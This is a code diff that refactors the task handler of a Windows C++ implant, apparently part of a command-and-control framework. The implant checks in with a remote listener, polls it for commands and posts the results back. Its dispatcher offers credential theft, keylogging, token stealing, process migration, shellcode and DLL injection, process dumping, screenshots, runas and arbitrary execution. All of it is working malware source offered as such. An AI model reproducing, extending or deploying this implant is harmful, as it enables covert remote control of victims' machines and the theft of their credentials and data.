@@ -2,23 +2,22 @@
 
 namespace Handler
 {
-    std::wstring GetInitialInfo()
+    std::wstring GetInitialInfo(State::StateManager& sm)
     {
         std::wstring wOS = L"windows";
         std::wstring wArch = L"";
         std::wstring wHostname = L"";
         std::wstring wListenerURL = L"";
-        std::wstring wImplantType = PAYLOAD_TYPE_W;
-        std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(PAYLOAD_SLEEP));
-        std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(PAYLOAD_JITTER));
-        std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(PAYLOAD_KILLDATE));
+        std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(sm.GetSleep()));
+        std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(sm.GetJitter()));
+        std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(sm.GetKillDate()));
 
         // Get listener URL
-        wListenerURL += LISTENER_PROTOCOL_W;
+        wListenerURL += std::wstring(sm.GetListenerProtocol());
         wListenerURL += L"://";
-        wListenerURL +=	LISTENER_HOST_W;
+        wListenerURL +=	std::wstring(sm.GetListenerHost());
         wListenerURL +=	L":";
-        wListenerURL +=	Utils::Convert::UTF8Decode(std::to_string(LISTENER_PORT));
+        wListenerURL +=	Utils::Convert::UTF8Decode(std::to_string(sm.GetListenerPort()));
 
         // Get architecture
         SYSTEM_INFO systemInfo;
@@ -44,7 +43,7 @@ namespace Handler
         wJson += L",";
         wJson += L"\"listenerURL\":\"" + wListenerURL + L"\"";
         wJson += L",";
-        wJson += L"\"implantType\":\"" + wImplantType + L"\"";
+        wJson += L"\"implantType\":\"" + std::wstring(sm.GetPayloadType()) + L"\"";
         wJson += L",";
         wJson += L"\"sleep\":" + wSleep + L"";
         wJson += L",";
@@ -56,20 +55,37 @@ namespace Handler
         return wJson;
     }
 
+    VOID InitHTTP(State::StateManager& sm)
+    {
+		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
+			sm.GetListenerHost(),
+			sm.GetListenerPort()
+		);
+        sm.SetHSession(handlers.hSession);
+        sm.SetHConnect(handlers.hConnect);
+    }
+
+    VOID CloseHTTP(State::StateManager& sm)
+    {
+        System::Http::WinHttpCloseHandles(
+            sm.GetHSession(),
+            sm.GetHConnect(),
+            sm.GetHRequest()
+        );
+    }
+
+    // If success, get the agent UUID. This value will be used for subsequent processes.
     BOOL CheckIn(
-        HINTERNET hConnect,
-        LPCWSTR lpHost,
-        INTERNET_PORT nPort,
-        LPCWSTR lpPath,
+        State::StateManager& sm,
         const std::wstring& wInfoJson
     ) {
         std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
-            hConnect,
-            lpHost,
-            nPort,
-            lpPath,
+            sm.GetHConnect(),
+            sm.GetListenerHost(),
+            sm.GetListenerPort(),
+            sm.GetReqPathCheckIn(),
             L"POST",
             L"Content-Type: application/json\r\n",
             (LPVOID)sInfoJson.c_str(),
@@ -79,54 +95,56 @@ namespace Handler
         {
             return FALSE;
         }
+
+        // Receive the agent UUID.
+        std::wstring uuid = System::Http::ReadResponseText(resp.hRequest);
+        sm.SetUUID(uuid);
+        
         return TRUE;
     }
 
-    std::wstring GetTask(
-        HINTERNET hConnect,
-        LPCWSTR lpHost,
-        INTERNET_PORT nPort,
-        LPCWSTR lpPath
-    ) {
-        std::wstring task;
-        HINTERNET hRequest = NULL;
+    BOOL GetTask(State::StateManager& sm)
+    {
+        std::wstring wHeader = L"X-UUID: " + sm.GetUUID() + L"\r\n";
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
-            hConnect,
-            lpHost,
-            nPort,
-            lpPath,
+            sm.GetHConnect(),
+            sm.GetListenerHost(),
+            sm.GetListenerPort(),
+            sm.GetReqPathTaskGet(),
             L"GET",
-            NULL,
+            wHeader.c_str(),
             NULL,
             0
         );
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
-            return task;
+            return FALSE;
         }
 
-        hRequest = resp.hRequest;
+        sm.SetHRequest(resp.hRequest);
 
-        task = System::Http::ReadResponseText(hRequest);
-        return task;
+        std::wstring task = System::Http::ReadResponseText(resp.hRequest);
+        sm.SetTask(task);
+
+        return TRUE;
     }
 
-    std::wstring ExecuteTask(
-        HINSTANCE hInstance,
-        INT nCmdShow,
-        HINTERNET hConnect,
-        const std::wstring& task,
-        INT &nSleep
-    ) {
-        // If no task, return immediatly.
+    BOOL ExecuteTask(State::StateManager& sm)
+    {
+        std::wstring task = sm.GetTask();
+
         if (wcscmp(task.substr(0, 4).c_str(), L"cat ") == 0)
         {
-            return Task::Cat(task.substr(4, task.size()));
+            sm.SetTaskResult(Task::Cat(task.substr(4, task.size())));
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"cd ") == 0)
         {
-            return Task::Cd(task.substr(3, task.size()));
+            sm.SetTaskResult(Task::Cd(task.substr(3, task.size())));
+        }
+        else if (wcscmp(task.substr(0, 8).c_str(), L"connect ") == 0)
+        {
+            sm.SetTaskResult(Task::Connect(sm, task.substr(8, task.size())));
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
         {
@@ -134,13 +152,14 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
-            return Task::Cp(wArgs[1], wArgs[2]);
+
+            sm.SetTaskResult(Task::Cp(wArgs[1], wArgs[2]));
         }
         else if (wcscmp(task.c_str(), L"creds steal") == 0)
         {
-            return Task::CredsSteal();
+            sm.SetTaskResult(Task::CredsSteal());
         }
         else if (wcscmp(task.substr(0, 4).c_str(), L"dll ") == 0)
         {
@@ -148,14 +167,15 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
             std::wstring wDllSrc;
             for (size_t i = 2; i < wArgs.size(); i++)
             {
                 wDllSrc += wArgs[i];
             }
-            return Task::Dll(hConnect, wArgs[1], wDllSrc);
+
+            sm.SetTaskResult(Task::Dll(sm, wArgs[1], wDllSrc));
         }
         else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
         {
@@ -163,45 +183,46 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
-            return Task::Download(hConnect, wArgs[1], wArgs[2]);
+
+            sm.SetTaskResult(Task::Download(sm, wArgs[1], wArgs[2]));
         }
         else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
         {
-            return Task::Execute(task.substr(8, task.size()));
+            sm.SetTaskResult(Task::Execute(task.substr(8, task.size())));
         }
         else if (wcscmp(task.c_str(), L"groups") == 0)
         {
-            return Task::Groups();
+            sm.SetTaskResult(Task::Groups());
         }
         else if (wcscmp(task.c_str(), L"history") == 0)
         {
-            return Task::History();
+            sm.SetTaskResult(Task::History());
         }
         else if (wcscmp(task.c_str(), L"ip") == 0)
         {
-            return Task::Ip();
+            sm.SetTaskResult(Task::Ip());
         }
         else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
         {
-            return Task::KeyLog(task.substr(7, task.size()));
+            sm.SetTaskResult(Task::KeyLog(task.substr(7, task.size())));
         }
         else if (wcscmp(task.c_str(), L"kill") == 0)
         {
-            return Task::Kill();
+            sm.SetTaskResult(Task::Kill());
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
         {
-            return Task::Ls(task.substr(3, task.size()));
+            sm.SetTaskResult(Task::Ls(task.substr(3, task.size())));
         }
         else if (wcscmp(task.substr(0, 8).c_str(), L"migrate ") == 0)
         {
-            return Task::Migrate(task.substr(8, task.size()));
+            sm.SetTaskResult(Task::Migrate(task.substr(8, task.size())));
         }
         else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
         {
-            return Task::Mkdir(task.substr(6, task.size()));
+            sm.SetTaskResult(Task::Mkdir(task.substr(6, task.size())));
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
         {
@@ -209,29 +230,30 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
-            return Task::Mv(wArgs[1], wArgs[2]);
+
+            sm.SetTaskResult(Task::Mv(wArgs[1], wArgs[2]));
         }
         else if (wcscmp(task.c_str(), L"net") == 0)
         {
-            return Task::Net();
+            sm.SetTaskResult(Task::Net());
         }
         else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
         {
-            return Task::Procdump(task.substr(9, task.size()));
+            sm.SetTaskResult(Task::Procdump(task.substr(9, task.size())));
         }
         else if (wcscmp(task.c_str(), L"ps") == 0)
         {
-            return Task::Ps();
+            sm.SetTaskResult(Task::Ps());
         }
         else if (wcscmp(task.substr(0, 8).c_str(), L"ps kill ") == 0)
         {
-            return Task::PsKill(task.substr(8, task.size()));
+            sm.SetTaskResult(Task::PsKill(task.substr(8, task.size())));
         }
         else if (wcscmp(task.c_str(), L"pwd") == 0)
         {
-            return Task::Pwd();
+            sm.SetTaskResult(Task::Pwd());
         }
         else if (wcscmp(task.substr(0, 12).c_str(), L"reg subkeys ") == 0)
         {
@@ -239,7 +261,7 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() < 5)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
             BOOL bRecurse = wArgs[2] == L"true";
             std::wstring wRootKey = wArgs[3];
@@ -248,7 +270,8 @@ namespace Handler
             {
                 wSubKey += wArgs[i];
             }
-            return Task::RegSubKeys(wRootKey, wSubKey, bRecurse);
+
+            sm.SetTaskResult(Task::RegSubKeys(wRootKey, wSubKey, bRecurse));
         }
         else if (wcscmp(task.substr(0, 11).c_str(), L"reg values ") == 0)
         {
@@ -256,7 +279,7 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() < 5)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
             BOOL bRecurse = wArgs[2] == L"true";
             std::wstring wRootKey = wArgs[3];
@@ -265,23 +288,42 @@ namespace Handler
             {
                 wSubKey += wArgs[i];
             }
-            return Task::RegValues(wRootKey, wSubKey, bRecurse);
+
+            sm.SetTaskResult(Task::RegValues(wRootKey, wSubKey, bRecurse));
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
         {
-            return Task::Rm(task.substr(3, task.size()));
+            sm.SetTaskResult(Task::Rm(task.substr(3, task.size())));
         }
         else if (wcscmp(task.substr(0, 6).c_str(), L"rmdir ") == 0)
         {
-            return Task::Rmdir(task.substr(6, task.size()));
+            sm.SetTaskResult(Task::Rmdir(task.substr(6, task.size())));
+        }
+        else if (wcscmp(task.substr(0, 6).c_str(), L"runas ") == 0)
+        {
+            // Parse arguments.
+            std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
+            if (wArgs.size() < 3)
+            {
+                return FALSE;
+            }
+            std::wstring wUser = wArgs[1];
+            std::wstring wPassword = wArgs[2];
+            std::wstring wCmd;
+            for (size_t i = 3; i < wArgs.size(); i++)
+            {
+                wCmd += wArgs[i];
+            }
+
+            sm.SetTaskResult(Task::RunAs(wUser, wPassword, wCmd));
         }
         else if (wcscmp(task.c_str(), L"screenshot") == 0)
         {
             // Is DLL implant, the screenshot feature is not available.
             #ifndef IS_DLL
-            return Task::Screenshot(hInstance, nCmdShow);
+            sm.SetTaskResult(Task::Screenshot(sm));
             #else
-            return L"Error: Cannot take a screenshot on DLL.";
+            sm.SetTaskResult(L"Cannot take a screenshot on DLL.");
             #endif
         }
         else if (wcscmp(task.substr(0, 10).c_str(), L"shellcode ") == 0)
@@ -290,7 +332,7 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
             std::wstring wPid = wArgs[1];
             std::wstring wSrc;
@@ -298,15 +340,16 @@ namespace Handler
             {
                 wSrc += wArgs[i];
             }
-            return Task::Shellcode(hConnect, wArgs[1], wSrc);
+
+            sm.SetTaskResult(Task::Shellcode(sm, wArgs[1], wSrc));
         }
         else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
         {
-            return Task::Sleep(task.substr(6, task.size()), nSleep);
+            sm.SetTaskResult(Task::Sleep(sm, task.substr(6, task.size())));
         }
         else if (wcscmp(task.c_str(), L"token revert") == 0)
         {
-            return Task::TokenRevert();
+            sm.SetTaskResult(Task::TokenRevert());
         }
         else if (wcscmp(task.substr(0, 12).c_str(), L"token steal ") == 0)
         {
@@ -314,9 +357,10 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 4)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
-            return Task::TokenSteal(wArgs[2], wArgs[3]);
+
+            sm.SetTaskResult(Task::TokenSteal(wArgs[2], wArgs[3]));
         }
         else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
         {
@@ -324,63 +368,56 @@ namespace Handler
             std::vector<std::wstring> wArgs = Utils::Split::Split(task, L' ');
             if (wArgs.size() != 3)
             {
-                return L"Error: Invalid argument.";
+                return FALSE;
             }
-            return Task::Upload(hConnect, wArgs[1], wArgs[2]);
+
+            sm.SetTaskResult(Task::Upload(sm, wArgs[1], wArgs[2]));
         }
         else if (wcscmp(task.c_str(), L"users") == 0)
         {
-            return Task::Users();
+            sm.SetTaskResult(Task::Users());
         }
         else if (wcscmp(task.c_str(), L"whoami") == 0)
         {
-            return Task::Whoami();
+            sm.SetTaskResult(Task::Whoami());
         }
         else if (wcscmp(task.c_str(), L"whoami priv") == 0)
         {
-            return Task::WhoamiPriv();
+            sm.SetTaskResult(Task::WhoamiPriv());
         }
         else
         {
-            return L"Error: Invalid task.";
+            sm.SetTaskResult(L"Error: Invalid task.");
         }
+
+        return TRUE;
     }
 
-    BOOL SendTaskResult(
-        HINTERNET hConnect,
-        LPCWSTR lpHost,
-        INTERNET_PORT nPort,
-        LPCWSTR lpPath,
-        const std::wstring& task,
-        const std::wstring& taskResult
-    ) {
+    BOOL SendTaskResult(State::StateManager& sm)
+    {
         System::Http::WinHttpResponse resp;
-
-        if (wcscmp(taskResult.c_str(), L"") == 0) {
-            return FALSE;
-        }
 
         // Prepare additional headers
         std::wstring wHeaders;
-        wHeaders = L"X-Task: " + task + L"\r\n";
+        wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n" + L"X-Task: " + sm.GetTask() + L"\r\n";
 
         // When the "procdump" and "screenshot" tasks,
         // read bytes of the captured image file and send them.
         if (
-            (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0) ||
-            (wcscmp(task.c_str(), L"screenshot") == 0)
+            (wcscmp(sm.GetTask().substr(0, 9).c_str(), L"procdump ") == 0) ||
+            (wcscmp(sm.GetTask().c_str(), L"screenshot") == 0)
         ) {
             // Load a captured image file
-            std::vector<char> fileData = System::Fs::ReadBytesFromFile(taskResult);
+            std::vector<char> fileData = System::Fs::ReadBytesFromFile(sm.GetTaskResult());
 
-            // Delete the image file
-            DeleteFile(taskResult.c_str());
+            // Delete the temp procdump/image file
+            DeleteFile(sm.GetTaskResult().c_str());
 
             resp = System::Http::SendRequest(
-                hConnect,
-                lpHost,
-                nPort,
-                lpPath,
+                sm.GetHConnect(),
+                sm.GetListenerHost(),
+                sm.GetListenerPort(),
+                sm.GetReqPathTaskResult(),
                 L"POST",
                 wHeaders.c_str(),
                 (LPVOID)fileData.data(),
@@ -390,20 +427,19 @@ namespace Handler
         else
         {
             // I couln't retrieve the `wstring` length correctly, so use `string` here.
-            std::string sTaskResult = Utils::Convert::UTF8Encode(taskResult);
+            std::string sTaskResult = Utils::Convert::UTF8Encode(sm.GetTaskResult());
 
             resp = System::Http::SendRequest(
-                hConnect,
-                lpHost,
-                nPort,
-                lpPath,
+                sm.GetHConnect(),
+                sm.GetListenerHost(),
+                sm.GetListenerPort(),
+                sm.GetReqPathTaskResult(),
                 L"POST",
                 wHeaders.c_str(),
                 (LPVOID)sTaskResult.c_str(),
                 (DWORD)strlen(sTaskResult.c_str())
             );
         }
-
 
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
